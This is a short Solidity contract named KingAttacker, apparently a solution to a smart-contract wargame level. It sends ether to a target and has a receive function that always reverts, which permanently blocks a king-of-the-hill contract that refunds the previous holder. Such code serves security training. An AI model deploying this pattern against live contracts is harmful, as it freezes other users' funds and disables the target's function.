pragma solidity 0.8.15;

contract KingAttacker {
    error WeDontAcceptEth();
    function attack(address target) external payable {
        payable(target).call{value: msg.value}("");
    }

    receive() external payable {
        revert WeDontAcceptEth( );
    }
}